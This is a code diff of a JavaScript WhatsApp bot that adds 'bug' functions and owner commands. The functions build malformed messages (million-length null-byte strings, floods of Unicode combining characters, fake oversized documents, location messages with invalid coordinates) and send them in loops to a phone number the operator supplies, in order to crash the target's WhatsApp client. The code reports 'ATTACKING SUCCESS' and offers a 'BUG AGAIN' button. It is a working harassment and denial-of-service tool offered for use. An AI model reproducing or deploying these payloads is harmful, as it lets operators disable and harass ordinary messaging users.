@@ -306,7 +306,119 @@ module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
         AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
         }
  
- //bug functions
+//=============UPDATED BUGS==============\\
+const fakejpg = fs.readFileSync(`./src/data/function/ABug/xx1.png`)
+const randomImage =[
+'https://i.imgur.com/QfDM014.jpeg'];
+const painbug = { 
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `𝐐𝐔𝐄𝐄𝐍 𝐀𝐋𝐘𝐀`
+}
+}
+}
+const Alyabug = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Pᴀɪɴᴢʏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
+}
+]
+}
+}
+}
+}
+
+async function sendViewOnceMessages(jid) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': ''
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': '',
+              'subtitle': '',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            })
+          })
+        }
+      }
+    }, {});
+    qio.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+}
+
+async function sendSystemCrashMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'interactiveMessage': {
+          'header': {
+            'title': '',
+            'subtitle': " "
+          },
+          'body': {
+            'text': "𝐀𝐋𝐘𝐀 𝐒𝐞𝐧𝐭 𝐅𝐥𝐨𝐰𝐞𝐫𝐬"
+          },
+          'footer': {
+            'text': 'M҉A҉D҉E҉ B҉Y҉ S҉T҉A҉R҉ K҉I҉N҉G҉'
+          },
+          'nativeFlowMessage': {
+            'buttons': [{
+              'name': 'cta_url',
+              'buttonParamsJson': "{ display_text : '𝐀𝐋𝐘𝐀', url : , merchant_url :  }"
+            }],
+            'messageParamsJson': "\0".repeat(1000000)
+          }
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
 const force = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -343,20 +455,49 @@ remoteJid: "status@broadcast"
 "interactiveMessage": { 
 "header": {
 "hasMediaAttachment": true,
-"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
+"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌟STAR KING 🌟STAR KING 🌟STAR KING\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-}
-]
-}
-}
-}
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍ CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
+_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
+𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
+*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*
+
+𝗗𝗮𝘀𝗮𝗿 
+𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
+𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+
 }
 
+]
+
+}
+
+}
+
+}
+
+}
+async function bakdok(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "documentMessage": {
+    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+    "mimetype": "penis",
+    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+    "fileLength": "999999999",
+    "pageCount": 999999999,
+    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+    "fileName": `𝐀𝐋𝐘𝐀 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(60000),
+    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+    "mediaKeyTimestamp": "1715880173"
+  }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
 const oneclickalya = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -538,92 +679,6 @@ async function sendViewOnceMessages(jid, count) {
     });
   }
 }
-
-async function sendSystemCrashMessage(jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'viewOnceMessage': {
-      'message': {
-        'interactiveMessage': {
-          'header': {
-            'title': '',
-            'subtitle': " "
-          },
-          'body': {
-            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
-          },
-          'footer': {
-            'text': 'xp'
-          },
-          'nativeFlowMessage': {
-            'buttons': [{
-              'name': 'cta_url',
-              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
-            }],
-            'messageParamsJson': "\0".repeat(10000000)
-          }
-        }
-      }
-    }
-  }), {
-    'userJid': jid
-  });
-  await AlyaBotInc.relayMessage(jid, messageContent.message, {
-    'participant': {
-      'jid': jid
-    },
-    'messageId': messageContent.key.id
-  });
-}
-async function sendListMessage(jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'listMessage': {
-      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(92000000),
-      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
-      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
-      'buttonText': null,
-      'listType': 2,
-      'productListInfo': {
-        'productSections': [{
-          'title': "lol",
-          'products': [{
-            'productId': "4392524570816732"
-          }]
-        }],
-        'productListHeaderImage': {
-          'productId': "4392524570816732",
-          'jpegThumbnail': null
-        },
-        'businessOwnerJid': "0@s.whatsapp.net"
-      }
-    },
-    'footer': "lol",
-    'contextInfo': {
-      'expiration': 6000000,
-      'ephemeralSettingTimestamp': "1679959486",
-      'entryPointConversionSource': "global_search_new_chat",
-      'entryPointConversionApp': "whatsapp",
-      'entryPointConversionDelaySeconds': 5,
-      'disappearingMode': {
-        'initiator': "INITIATED_BY_ME"
-      }
-    },
-    'selectListType': 2,
-    'product_header_info': {
-      'product_header_info_id': 292928282928,
-      'product_header_is_rejected': false
-    }
-  }), {
-    'userJid': jid
-  });
-  
-  await AlyaBotInc.relayMessage(jid, messageContent.message, {
-    'participant': {
-      'jid': jid
-    },
-    'messageId': messageContent.key.id
-  });
-}
-
 async function sendLiveLocationMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'viewOnceMessage': {
@@ -738,20 +793,156 @@ function sendMessageWithMentions(text, mentions = [], quoted = false) {
     });
   }
 }
+async function ListMSGVIP3(userJid) {
+    const messageContent = generateWAMessageFromContent(
+        userJid,
+        proto.Message.fromObject({
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            title: '',
+                            subtitle: '𝐀𝐋𝐘𝐀',
+                        },
+                        body: {
+                            text: '𝐱',
+                        },
+                        footer: {
+                            text: '𝐂𝐫𝐚𝐬𝐡',
+                        },
+                        nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: 'cta_url',
+                                    buttonParamsJson: "{ display_text : '𝐀𝐋𝐘𝐀', url : , merchant_url :  }",
+                                },
+                                {
+                                    name: 'cta_url',
+                      buttonParamsJson:
+                        "{ display_text : '𝐗', url : , merchant_url :  }",
+                    },
+                    {
+                      name: 'cta_url',
+                      buttonParamsJson:
+                        "{ display_text : '𝐂𝐫𝐚𝐬𝐡', url : , merchant_url :  }",
+                                },
+                            ],
+                            messageParamsJson: ''.repeat(999999),
+                        },
+                    },
+                },
+            },
+        }),
+        { userJid: userJid }
+    );
+    await AlyaBotInc.relayMessage(userJid, messageContent.message, {
+        participant: { jid: userJid },
+        messageId: messageContent.key.id,
+    });
+}
 
-const xbug2 = {
-key: {
-remoteJid: 'status@broadcast',
-fromMe: false, 
-participant: '0@s.whatsapp.net'
-},
+async function ListMSGVIP4(userJid) {
+    const messageContent = generateWAMessageFromContent(
+        userJid,
+        proto.Message.fromObject({
+            listMessage: {
+                title:
+              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
+                footerText: '',
+                description: '',
+                buttonText: null,
+                listType: 2,
+                productListInfo: {
+                    productSections: [
+                        {
+                            title: 'Hemm',
+                            products: [{ productId: '4392524570816732' }],
+                        },
+                    ],
+                    productListHeaderImage: {
+                        productId: '4392524570816732',
+                        jpegThumbnail: null,
+                    },
+                    businessOwnerJid: '0@s.whatsapp.net',
+                },
+            },
+            footer: 'ppq',
+            contextInfo: {
+                expiration: 604800,
+                ephemeralSettingTimestamp: '1679959486',
+                entryPointConversionSource: 'global_search_new_chat',
+                entryPointConversionApp: 'whatsapp',
+                entryPointConversionDelaySeconds: 9,
+                disappearingMode: { initiator: 'INITIATED_BY_ME' },
+            },
+            selectListType: 2,
+            product_header_info: {
+                product_header_info_id: 292928282928,
+                product_header_is_rejected: false,
+            },
+        }),
+        { userJid: userJid }
+    );
+    await AlyaBotInc.relayMessage(userJid, messageContent.message, {
+        participant: { jid: userJid },
+        messageId: messageContent.key.id,
+    });
+}
+
+async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
 message: {
-listResponseMessage: {
-title: botname
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `𝐀𝐋𝐘𝐀 𝐗 𝐂𝐫𝐚𝐬𝐡`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
 }
+}), { userJid: target, quoted: kuwoted })
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
 }
+
+async function bugpainz(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
+
+_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
+
+𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
+
+*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*
+
+𝗗𝗮𝘀𝗮𝗿 
+𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
+𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.
+乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),
+
+    "sequenceNumber": "0",
+
+    "jpegThumbnail": ""
+
+     }
+
+  }
+
 }
-//end bug functions
+
+}), { userJid: target, quoted: kuwoted })
+
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+
+}
+//==========BUG FUNCTIONS END============\\
 
         //premium
         async function replyprem(teks) {
@@ -16324,6 +16515,110 @@ var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await AlyaBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 
 }
+case 'break-immu': case 'gbcrasher': case 'wa-ori': case 'wa-busins': case 'wa-mod': {
+    if (!isCreator) return reply(mess.OnlyOwner)
+    if (!text) return reply(`Example: .${command} 234xxx`)
+    
+    let peler = q.replace(/[^0-9]/g, "")
+    if (peler.startsWith('0')) return reply(`\`[ # ]\` Type Number Without Adding The First 0 \nExample : .${command} 234xxx`)
+    
+    let Pe = peler + '@s.whatsapp.net'
+    await reply(mess.bugrespon)
+   
+    let virusNames = {
+        'break-immu': 'Immunity-Crasher',
+        'gbcrasher': 'GB-Crasher',
+        'wa-ori': 'WhatsApp-Origin',
+        'wa-busins': 'Business-Blaster',
+        'wa-mod': 'Hack-Lock'
+    }
+
+    for (let j = 0; j < 5; j++) {
+        await sendPaymentInfoMessage(Pe, force2)
+        await bakdok(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, force2)
+        await bakdok(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, Alyabug)
+        await penghitaman(Pe, painbug)
+        await sendPaymentInfoMessage(Pe, zpay)
+        await iponcrash(Pe, force)
+        await sendPaymentInfoMessage(Pe, painbug)
+        await sendSystemCrashMessage(Pe, force)
+        await sendPaymentInfoMessage(Pe, Alyabug)
+        await iponcrash(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, force)
+        await penghitaman(Pe, painbug)
+        await sendPaymentInfoMessage(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, zpay)
+        await ngeloc(Pe, force)
+        await sendPaymentInfoMessage(Pe, zpay)
+        await bakdok(Pe, Alyabug)
+        await sendPaymentInfoMessage(Pe, force2)
+        await penghitaman(Pe, painbug)
+        await sendPaymentInfoMessage(Pe, force)
+        await sendPaymentInfoMessage(Pe, painbug)
+        await ngeloc(Pe, force2)
+    if (j === 1) { 
+        msg = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "messageContextInfo": {
+                        "deviceListMetadata": {},
+                        "deviceListMetadataVersion": 2
+                    },
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: ''
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "> Queen Rias Crasher"
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
+
+𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${Pe}*
+𖥂 𝐁𝐔𝐆 : *${virusNames[command]}*
+
+┌────᚜「 𝗡𝗼𝘁𝗲 」
+╰┈ 𝐏𝐀𝐔𝐒𝐄 𝐓𝐇𝐄 𝐁𝐎𝐓 𝐅𝐎𝐑 𝟏𝟎 𝐌𝐈𝐍𝐔𝐓𝐄𝐒, 𝐒𝐎 𝐓𝐇𝐀𝐓 𝐘𝐎𝐔𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐃𝐎𝐍'𝐓 𝐆𝐄𝐓 𝐁𝐀𝐍𝐍𝐄𝐃
+
+—𝐑𝐢𝐚⃟𝐬 ⃟𝐂𝐨𝐫𝐞 𝐇𝐚𝐬 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ‹›`,
+                            subtitle: "Rias Loves You",
+                            hasMediaAttachment: true,
+                            ...(await prepareWAMessageMedia(
+                                {
+                                    image: { url: randomImage }
+                                },
+                                { upload: Rias.waUploadToServer }
+                            ))
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: [
+                                {
+                                    "name": "quick_reply",
+                                    "buttonParamsJson": "{\"display_text\":\"𝐊𝐈𝐍𝐆\",\"id\":\".owner\"}"
+                                },
+                                {
+                                    "name": "quick_reply",
+                                    "buttonParamsJson": `{\"display_text\":\"𝐁𝐔𝐆 𝐀𝐆𝐀𝐈𝐍!!\",\"id\":\".${command} ${Pe}\"}`
+
+                                }
+                            ],
+                        })
+                    })
+                }
+            }
+        }, {})
+
+        await AlyaBotInc.relayMessage(
+            msg.key.remoteJid,
+            msg.message,
+            { messageId: msg.key.id }
+        )
+    }
+}
+}
 break
 case 'telestick': {
 	if (m.isGroup) return AlyaStickPrivate()
@@ -27116,13 +27411,120 @@ break
 case 'clearchat':
 m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 break
-case 'xreact': {
-if (!isPremium) return replygcalya(mess.prem)
-if (!m.quoted) return replygcalya(`Example usage: ${prefix + command} reply chat`)
-await AlyaBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: 'https://whatsapp.com/channel/0029VaeW5Tw4yltQOYIO5E2D', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: abug2 })
-await sleep(2000)
-await AlyaBotInc.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
-}
+case '💀':
+  let virusNames = {
+    '💀': 'Flowers'
+  }
+
+  if (!isCreator) return
+
+    // Jumlah
+  let jumlah = text.split(" ")[1];
+  jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 1;
+  
+  starttask(emooji)
+
+  for (let j = 0; j < jumlah; j++) {
+    await sendPaymentInfoMessage(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, force2)
+    await bakdok(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, force2)
+    await bakdok(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, Alyabug)
+    await penghitaman(m.chat, painbug)
+    await sendPaymentInfoMessage(m.chat, zpay)
+    await iponcrash(m.chat, force)
+    await sendPaymentInfoMessage(m.chat, painbug)
+    await sendSystemCrashMessage(m.chat, force)
+    await sendPaymentInfoMessage(m.chat, Alyabug)
+    await iponcrash(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, force)
+    await penghitaman(m.chat, painbug)
+    await sendPaymentInfoMessage(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, zpay)
+    await ngeloc(m.chat, force)
